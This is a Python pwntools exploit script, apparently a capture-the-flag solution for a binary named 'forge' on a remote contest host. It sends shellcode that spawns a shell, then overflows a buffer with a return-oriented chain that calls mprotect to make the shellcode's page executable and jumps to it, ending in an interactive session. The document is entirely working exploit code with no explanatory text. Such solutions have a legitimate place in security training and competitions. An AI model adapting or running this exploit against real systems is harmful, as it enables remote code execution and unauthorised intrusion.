#!/usr/bin/env python3

from pwn import *

elf = ELF('./forge', checksec=False)
context.binary = elf
context.arch = 'amd64'

HOST = "offsec.m0lecon.it"
PORT = 13558
OFFSET_TO_RIP = 72

shellcode = asm(shellcraft.sh())
shellcode_addr = elf.sym.shellcode
page = shellcode_addr & ~0xfff

def conn():
    if not args.LOCAL:
        return remote(HOST, PORT)
    return process(elf.path)

p = conn()

p.recvuntil(b'shellcode')
p.send(shellcode.ljust(0x400, b'\x90'))

payload = flat(
    b'A' * OFFSET_TO_RIP,
    p64(elf.sym.ret_gadget),
    p64(elf.sym.pop_rdi_ret),
    p64(page),
    p64(elf.sym.pop_rsi_ret),
    p64(0x1000),
    p64(elf.sym.pop_rdx_ret),
    p64(7),
    p64(elf.plt.mprotect),
    p64(shellcode_addr)
)

p.recvuntil(b'Input')
p.send(payload)
p.interactive()